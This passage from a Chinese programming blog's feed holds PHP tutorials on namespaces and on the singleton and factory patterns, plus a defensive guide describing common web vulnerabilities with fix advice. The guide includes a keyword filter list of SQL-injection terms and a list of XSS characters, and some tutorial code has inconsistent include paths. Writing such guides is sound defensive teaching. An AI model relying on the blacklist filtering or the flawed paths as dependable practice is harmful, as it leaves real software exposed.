——–核心工具</p><p>2、业务说明</p><ul><li>root根目录，存放用户可以直接访问的文件，文件都是请求controller里的文件</li><li>controller目录，存放业务逻辑文件，所有业务都是类文件，业务要操作数据库，请求model里的文件，属于controller空间</li><li>model目录，存放数据库操作的类文件，一张表一个类文件，属于model空间</li><li>core目录，核心工具的存放，属于core空间</li></ul><p>3、创建3个文件：分表代表root目录下（不需要空间），controller目录下，controller空间，model目录下的model空间</p><pre><code># root目录下：index.php# 啥都不用做，直接包含controller文件include_once &apos;controller/User.php&apos;;# $u = new User();                            # 错误：当前空间没有User类$u = new controller\User();                     # 限定名称访问：因为controller空间属于全局空间$u-&gt;display();# root/core目录下：DB.phpnamespace core;class DB{    private $link;    public function __construct(){        # 数据库初始化    }    # 简单效果：查询全部数据    public function getAll($sql){        return &apos;数据查询结果&lt;br&gt;&apos;;    }}# root/model目录下：User.phpnamespace model;# 加载DB类include_once &apos;../DB.php&apos;;    # 建议使用绝对路径：../和./都会因为嵌套包含而错误class User{    public function getAllUsers(){        # 假设数据库连接、数据库、表都已经存在        $sql = &quot;select * from user&quot;;        # 调用更高级的操作类实现SQL执行并返回结果：DB属于Core空间，使用完全限定名称访问        $db = new \Core\DB();        return $db-&gt;getAll($sql);    }}# root/controller目录下：User.phpnamespace controller;class User{    public function display(){        # 调用模型目录下的user类实现数据库操作：使用完全限定名称访问        include_once &apos;../Model/User.php&apos;;    # 建议使用绝对路径：../和./都会因为嵌套包含而错误        $u = new \Model\User();        $users = $u-&gt;getAllUsers();        var_dump($users);    }}</code></pre><p>4、代码说明</p><ul><li>index.php在root目录下，没有定义空间，内部元素属于全局空间：index.php包含了子目录controller下的User.php，而User类属于controller空间，所以在index.php中访问User类的使用，可以使用限定名称（全局空间的子空间controller\空间元素），或者完全限定名称（\子空间\空间元素）</li><li>controller/User.php在root/controller文件夹下，定义了空间controller，所以文件里面所有的访问，默认都是在controller下找。controller/User类中用到了model/User类，所以需要使用完全限定名称访问（同级别不同空间）\model\User</li><li>model/User.php在root/model文件夹下，定义了空间model，所以文件里所有的访问，默认都是在model下找。model/User类中用到了core/DB类，所以需要使用完全限定名称访问\core\DB</li><li>core/DB.php在root/core文件夹下，定义了空间core</li></ul><blockquote><p>小结</p></blockquote><p>1、空间的实际应用是以文件为单位定义空间的</p><p>2、空间的划分是按业务对应的脚本进行划分的，如业务controller，数据model之类</p><p>3、文件的包含和空间的包含没有联系，二者是独立的：文件是在加载文件时，而空间是在进入内存后</p><p>4、空间应用，通常是采用非限定名称（自己空间里）和完全限定名称访问（其他空间），实际上我们建议将完全限定名称转换成非限定名称</p><h2 id="6、命名空间引入"><a href="#6、命名空间引入" class="headerlink" title="6、命名空间引入"></a><strong>6、命名空间引入</strong></h2><blockquote><p>目标：理解空间引入的逻辑和优势，掌握空间引入</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>命名空间引入</strong>：是将另外一个空间的元素引入到当前空间来，当做当前空间的元素访问</p><ul><li>空间元素引入可以减少复杂的完全限定名称访问，取而代之的是非限定名称访问</li><li>可以快速的实现将当前需要使用的空间元素引入到当前文件</li><li><p>空间引入语法：use关键字</p><ul><li>元素关键字：默认是类，可以有function（函数）和const（常量）</li></ul><p>use [元素关键字] []空间名\元素名;    # 空间名是一级空间</p></li><li><p>别名：引入的元素与当前空间已有元素重名或者想换成其他合适的名字</p><ul><li>使用别名后，原来的名字在当前就不可用，只能使用别名</li></ul><p>use [元素关键字] 空间名\元素名 as 别名;</p></li><li><p>空间引入：可以一次性引入一个空间的所有元素，或者某个空间指定类型的多个元素</p><ul><li>空间引入是将被引入的空间的最后一级空间，当做当前空间的子空间</li><li>类引入不需要class关键字（默认就是class）</li></ul><h1 id="引入多个元素"><a href="#引入多个元素" class="headerlink" title="引入多个元素"></a>引入多个元素</h1><p>use [元素关键字] 空间名\元素名1 [as 别名],空间名\元素名2 …;    # 空间名可以不同，但是元素类型必须相同</p><h1 id="引入空间（全部元素）"><a href="#引入空间（全部元素）" class="headerlink" title="引入空间（全部元素）"></a>引入空间（全部元素）</h1><p>use 空间名;        # 将当前引入的空间（最后一级）当前当前所在空间的子空间</p></li></ul><blockquote><p>示例</p></blockquote><p>1、空间引入方式：use关键字</p><pre><code>namespace space;class Man{}namespace space1;# 引入空间元素use space\Man;new Man();</code></pre><p><strong>注意</strong>：use进行空间包含的时候，默认是从全局空间开始构建空间路径的（不是自己空间的相对路径），所以上述代码等价于以下代码</p><pre><code>namespace space;class Man{}namespace space1;# 引入空间元素use \space\Man;</code></pre><p>2、空间引入的元素默认是类，如果要引入其他元素，就必须使用相应关键字：function和const</p><pre><code>namespace space;function display(){}class Man{}const PI = 3.14;namespace space1;# 引入空间元素use function space\display;         # 引入函数use space\Man;                    # 引入类use const space\PI;                # 引入常量display();                        new Man();echo PI;                            </code></pre><p>3、如果被引入的元素在当前空间已经存在，则会出现重名，解决方案是使用别名 as alias</p><pre><code>namespace space;function display(){}class Man{}const PI = 3.14;namespace space1;class Man{}# 引入空间元素# use space\Man;                # 错误：当前空间已经存在Manuse space\Man as M;use function space\display as dis;use const space\PI as D;</code></pre><p>4、一旦引入的时候使用了别名，那么在使用的时候就直接通过别名使用</p><pre><code>namespace space;function display(){}class Man{}namespace space1;class Man{}# 引入空间元素use space\Man as M;new M();                # 使用别名</code></pre><p>5、如果一个空间有多个元素要引入，那么可以进行一次引入多个，使用逗号<code>,</code>分隔即可</p><pre><code>namespace space;function display(){}class Man{}class Woman{}namespace space1;class Man{}# 一次引入多个use space\Man as M,space\Woman;        # 虽然可以批量引入（不同空间也行），但是每个元素都需要带上空间# 引入了一个Man类别名为M，Woman类没有定义别名</code></pre><p>6、如果说确定一个空间里的所有元素都需要引入进来，也可以直接引入空间</p><pre><code>namespace space;class Man{}namespace space1;# 引入空间use space;</code></pre><p>7、如果是直接进行空间引入，非限定名称的访问访问的只会是当前自己空间而非引入的空间，要访问引入空间，得使用限定名称访问：即引入的空间最后一级空间名字+元素（引入空间当做当前空间的子空间）</p><pre><code>namespace space\space1\space2;class Man{}namespace space3;class Man{}# 引入空间use space\space1\space2;new Man();                        # 访问的是space3\Mannew space2\Man();                # 使用引入空间的最后一级空间访问</code></pre><blockquote><p>小结</p></blockquote><p>1、空间引入是解决访问时的麻烦：由完全限定名称（限定名称）变成非限定名称访问</p><p>2、空间元素都可以引入，但是引入方式有区别</p><ul><li>类直接引入</li><li>函数需要在use之后跟关键字function</li><li>常量需要在use之后跟关键字const</li></ul><p>3、空间引入过程中如果出现重名，需要使用别名来处理，引入后在空间里可以直接访问别名</p><p>4、可以一次性引入多个空间内的多个元素（类型相同：每个元素必须在前面加上空间路径）</p><p>5、如果必要的情况下，也可以直接使用空间引入，但是注意被引入空间的元素不允许直接使用非限定名称访问，必须使用被引入空间的最后一级空间+元素访问（不常使用，引入方便但是使用不方便）</p><h2 id="7、总结"><a href="#7、总结" class="headerlink" title="7、总结"></a>7、总结</h2><p>1、命名空间namespace不是PHP特有的，是很多编程语言都有的用来解决结构同名的方案</p><p>2、命名空间一般只针对某个具体的结构（类和函数，较少针对常量）</p><p>3、命名空间的存在会让元素的访问变得不那么直接，我们需要选择合适的方式来调用</p><ul><li>非限定名称访问</li><li>限定名称访问</li><li>完全限定名称访问</li></ul><p>4、成熟的大中型项目都会使用命名空间，命名空间的命名规范通常与项目的文件夹名字同名</p><ul><li>方便后期内部加工处理：根据空间来选择文件所在路径（自动加载）</li><li>方便维护：根据空间来找到文件进行维护</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php面向对象:设计模式</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/3PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/3PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="转载于：黑马程序员武汉中心"><a href="#转载于：黑马程序员武汉中心" class="headerlink" title="转载于：黑马程序员武汉中心"></a>转载于：<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">黑马程序员武汉中心</a></h4><h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a><strong>设计模式</strong></h1><blockquote><p>学习目标：了解设计模式的概念，掌握设计模式在开发中的实际应用</p></blockquote><ul><li>单例模式</li><li>工厂模式</li></ul><blockquote><p>概念</p></blockquote><p><strong>设计模式</strong>：Design pattern， 是软件开发人员在软件开发过程中面临的一般问题的解决方案</p><ul><li>解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的</li><li>设计模式有很多（23种之多），在PHP中通常只用两种设计模式<ul><li>单例模式</li><li>工厂模式</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、设计模式是针对某种常见的需求而提供的一类解决方案</p><ul><li>windows系统的资源管理器用来显示计算机资源占用的情况</li><li>资源管理器本身要占用资源</li><li>如果要打开多个资源管理器，显示的资源占用情况应该一致，而资源管理器占用了更多的资源</li><li>因此：资源管理器一个就够了</li><li>针对上述需求：我们可以设计一种解决方案，保证资源管理器只产生一个</li><li>后来发现其他的需求也有同样的问题：数据库连接资源一个用户一个连接就够了，所以上述方案可以作为一种类似问题的通用解决方案，此时就可以理解为一个设计模式</li></ul><blockquote><p>小结</p></blockquote><p>1、设计模式是一类问题的通用解决方案</p><p>2、设计模式的存在，可以帮助我们快速的解决某类特定需求问题</p><p>3、通常设计模式的出现，都会需要额外增加开发难度和开发时间，因此我们要根据项目的需求来选择</p><h2 id="1、单例模式"><a href="#1、单例模式" class="headerlink" title="1、单例模式"></a><strong>1、单例模式</strong></h2><blockquote><p>目标：理解单例模式的概念，掌握单例模式解决方案</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>单例模式</strong>：singleton，是一种类的设计只会最多产生一个对象的设计思想</p><ul><li>单例模式的类只能在一次运行中产生一个对象</li><li>单例模式为了解决如何只产生一个对象，需要使用以下解决方案，简称<code>三私一公</code>：<ul><li><strong>私有化构造方法</strong>：不让在外部产生多个对象</li><li><strong>私有化克隆方法</strong>：不允许对象被克隆产生新对象</li><li><strong>公有化静态方法</strong>：运行进入类内部产生对象</li><li><strong>私有化静态属性</strong>：保存已经产生的对象</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义空类</p><p>2、杜绝能够产生多个对象的方式：构造方法私有化</p><p>3、想办法产生对象：进入类内部产生对象</p><p>4、想办法控制内部对象生产：只生产一个</p><p>5、杜绝外部拿着已有对象产生新对象：克隆方法私有化</p><blockquote><p>示例</p></blockquote><p>1、首先定义一个空类，叫做Singleton</p><pre><code># 创建一个空类class Singleton{}</code></pre><p>2、对象的产生是通过实例化产生的，而实例化是一种不可控行为，即可以产生无限多个对象，所以应该禁止：即”禁止实例化“，之所以是引号，是因为只能禁止在类外部实例化对象，私有化构造方法</p><pre><code># 在上述类中增加私有化构造方法class Singleton{   private function __construct(){} }# 尝试外部实例化$s = new Singleton();                # 致命错误：不能访问私有方法</code></pre><p>3、一旦外部不能实例化对象了，那就意味着根本“不可能”产生对象了，此时就只能想办法在还没有产生对象的时候就进入到“类内部”，意味着只能通过<code>静态方法</code>让类直接进入到类的内部</p><pre><code># 在上述类中增加公有静态方法public static function getInstance(){}</code></pre><p>4、进入类的内部依然还是没有对象，此时需要在静态方法内部进行对象实例化，并且把得到的对象返回到外部</p><pre><code># 修改公有静态方法：获取对象，并返回给外部调用出public static function getInstance(){    return new self();}# 外部获取对象$s = Singleton::getInstance();</code></pre><p>5、此方法开启了实例化对象的窗口，但是此时新问题出现：无限调用静态方法依然可以得到多个对象。如果想要该方法只返回一个对象，就得保证类内部有办法存着某个产生的对象，第一次产生新的，后面返回旧的。此时需要使用静态属性</p><pre><code># 增加静态属性：私有，不允许外部修改，否则外部修改之后就没有意义了private static $object = NULL;        # 初始化为NULL，没有对象# 修改静态方法public static function getInstance(){    # 判断内部属性是否存在对象（is_object函数）：最好的判定是存的对象是当前类的 instanceof    if(!(self::$object instanceof self)){        # 当前保存的内容不是当前类的对象        self::$object = new self();    }    # 返回对象给外部    return self::$object;}</code></pre><p>​    </p><p>6、此时可以保证外部无论多少次调用公有静态方法获取实例，都会只得到一个对象。但是此时外部对象依然可以产生新的对象：因为克隆，所以还必须禁止对象的克隆，即在类内部私有化克隆方法</p><pre><code># 在Singleton类中增加私有化的__clone()方法private function __clone(){}</code></pre><blockquote><p><strong>总结</strong></p></blockquote><p>1、单例模式就是设计的类最多只能得到一个对象</p><p>2、单例模式的设计规范就是“三私一公”</p><ul><li>私有化构造方法：禁止在类外无限实例化对象</li><li>私有化克隆方法：禁止对象无限克隆对象</li><li>私有化静态属性：保存类内部实例化得到的对象</li><li>公有化静态方法：允许外部通过调用类内部方法获取对象</li></ul><p>3、单例模式只是解决当前类对象的唯一性，如果还有其他功能诉求，可以在类中增加相应的其他类成员</p><p>4、单例模式的目的是为了保护资源的唯一性</p><h2 id="2、工厂模式"><a href="#2、工厂模式" class="headerlink" title="2、工厂模式"></a><strong>2、工厂模式</strong></h2><blockquote><p>目标：理解工厂模式的概念，掌握工厂模式解决方案</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>工厂模式</strong>：factory，是指像工厂一样流水线生产对象，由一个地方生产对象，其他位置就不需要额外实例化对象，从而可以方便后期代码统一的维护</p><ul><li><p>工厂模式是用来代生产对象</p></li><li><p>工厂模式下可以方便隐藏真实的类结构，因此也更加安全</p></li><li><p>工厂模式不需要关注工厂是如何产生对象，只需要让工厂产生对象</p></li></ul><blockquote><p>步骤</p></blockquote><p>1、创建不同类</p><p>2、创建生产对象的工厂类</p><p>3、调用工厂类产生对象</p><blockquote><p>示例</p></blockquote><p>1、工厂模式针对的是“相同模型”的统一产出，即使用工厂模式产出对象对应的类都有相同的结构或者功能。所以，首先要有一批具有类似功能的类（其实本质是同样的大类下的小类）</p><pre><code># 三个类文件# 人是一种大类，人下应该有男人、女人、人妖，各自成类class Man{    public function display(){        echo &apos;这是男人&lt;br/&gt;&apos;;    }    }class Woman{    public function display(){        echo &apos;这是女人&lt;br/&gt;&apos;;    }}class Ladyboy{    public function display(){        echo &apos;这是人妖&lt;br/&gt;&apos;;    }}</code></pre><p>​    </p><p>2、使用工厂模式，就需要增加一个工厂类：HumanFactory</p><pre><code># 人类工厂class HumanFactory{    public function getInstance($classname){        return new $classname();                # 可变变量使用    }    }$hf = new HumanFactory();$m = $hf-&gt;getInstance(&apos;Man&apos;);$m-&gt;display();                                    # 这是男人$w = $hf-&gt;getInstance(&apos;Woman&apos;);$w-&gt;display();                                    # 这是女人</code></pre><p>3、上述工厂类在对象生产的时候，额外产生了一个工厂类的对象，该对象无实际含义，因此可以使用更优的方式来生产对象：静态工厂</p><pre><code># 静态人类工厂class HumanFactory{    public static function getInstance($classname){        return new $classname();                # 可变变量使用    }    }$m = HumanFactory::getInstance(&apos;Man&apos;);$m-&gt;display();                                    # 这是男人$w = HumanFactory::getInstance(&apos;Woman&apos;);$w-&gt;display();                                    # 这是女人</code></pre><p>4、以上模式虽然也是工厂生产对象，但是是建立在使用者知道类名的前提下，而且如果原类名修改，依然需要多处修改代码，所以没有达到工厂模式的真实目的。修改工厂模式</p><pre><code># 静态人类工厂class HumanFactory{    public static function getInstance($flag){        # flag只是一种标志：不是类名        # $flag可以是m代表Man，w代表Woman，L代表Ladyboy        switch($flag){            case &apos;m&apos;:                return new Man();            case &apos;w&apos;:                return new Woman();            case &apos;L&apos;:                return new Ladyboy();            default:                return null;            # 匹配失败，返回空        }                }    }$m = HumanFactory::getInstance(&apos;m&apos;);$m-&gt;display();                                    # 这是男人$w = HumanFactory::getInstance(&apos;w&apos;);$w-&gt;display();                                    # 这是女人</code></pre><blockquote><p>小结</p></blockquote><p>1、工厂模式是一种按需生产对象的模式（一个工厂生产的对象应该相似）</p><p>2、工厂模式通常是需要在大型项目中，会出现很多的相同功能的类，此时可以使用工厂产生对象</p><p>3、工厂模式的优点是能够方便后期对类的维护（更名）</p><p>4、工厂模式的缺点是随着功能增加，会需要增加很多开发量（开发多个工厂）：以上只是一种简单工厂模式，复杂的工厂模式会有不同的工厂，调用时需要使用不同工厂来实现对象生产</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web常见漏洞描述及修复建议</title>
      <link href="/2021/07/23/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>/2021/07/23/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Web常见漏洞描述及修复建议"><a href="#Web常见漏洞描述及修复建议" class="headerlink" title="Web常见漏洞描述及修复建议"></a>Web常见漏洞描述及修复建议</h2><h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p><p>　　<strong>修复建议</strong></p><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p><p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p><p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p><p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p><p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p><p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p><p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p><p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>　　<strong>漏洞描述</strong></p><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p><p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p><p>XSS攻击可导致以下危害：</p><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p><p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p><p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p><p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p><p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p><p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p><p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p><p>　　<strong>修复建议</strong></p><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p><p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p><p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p><p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p><p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p><h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>　　<strong>漏洞详情</strong></p><p>　　参考：<a href="https://www.freebuf.com/company-information/165769.html" target="_blank" rel="noopener">https://www.freebuf.com/company-information/165769.html</a></p><h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>　　<strong>漏洞描述**</strong>：**</p><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><p>　　<strong>修复建议</strong></p><p>　　1、验证请求的Referer是否来自本网站，但可被绕过。</p><p>　　2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p><h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h2><p>　　<strong>漏洞描述</strong></p><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p><p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p><p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p><p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p><p>　　(5)、利用File协议读取本地文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p><p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p><p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>　　4、验证请求的文件格式</p><p>　　5、禁止跳转</p><p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p><p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><h2 id="6-任意命令-代码执行"><a href="#6-任意命令-代码执行" class="headerlink" title="6.任意命令/代码执行"></a>6.任意命令/代码执行</h2><p>　　<strong>漏洞描述</strong></p><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p><p>　　<strong>修复建议</strong></p><p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>　　2、减少或不使用代码或命令执行函数</p><p>　　3、客户端提交的变量在放入函数前进行检测</p><p>　　4、减少或不使用危险函数</p><h2 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p><p>　　<strong>修复建议</strong></p><p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p><p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p><p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p><p>　　4、严格限制上传的文件路径。</p><p>　　5、文件扩展名服务端白名单校验。</p><p>　　6、文件内容服务端校验。</p><p>　　7、上传文件重命名。</p><p>　　8、隐藏上传文件路径。</p><h2 id="8-目录穿越-目录遍历"><a href="#8-目录穿越-目录遍历" class="headerlink" title="8.目录穿越/目录遍历"></a>8.目录穿越/目录遍历</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p><p>　　<strong>修复建议</strong></p><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p><h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>　　<strong>漏洞描述</strong></p><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p><p>　　<strong>修复建议</strong></p><p>　　1、严格检查变量是否已经初始化。</p><p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p><p>　　3、严格检查文件包含函数中的参数是否外界可控。</p><h2 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p><p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p><p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p><p>　　3、增加人机验证机制，限制ip访问次数。</p><h2 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p><p>　　<strong>修复建议</strong></p><p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p><p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p><p>　　3、增加人机验证机制</p><p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p><h2 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p><p>　　<strong>修复建议</strong></p><p>　　1、对用户访问角色的权限进行严格的检查及限制。</p><p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p><h2 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p><p>　　<strong>修复建议</strong></p><p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p><p>　　2、可以使用session对用户的身份进行判断和控制。</p><h2 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p><p>　　<strong>修复建议</strong></p><p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p><p>　　2、设置目录访问权限</p><h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><p><strong>漏洞描述</strong></p><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p><p>可参考：<a 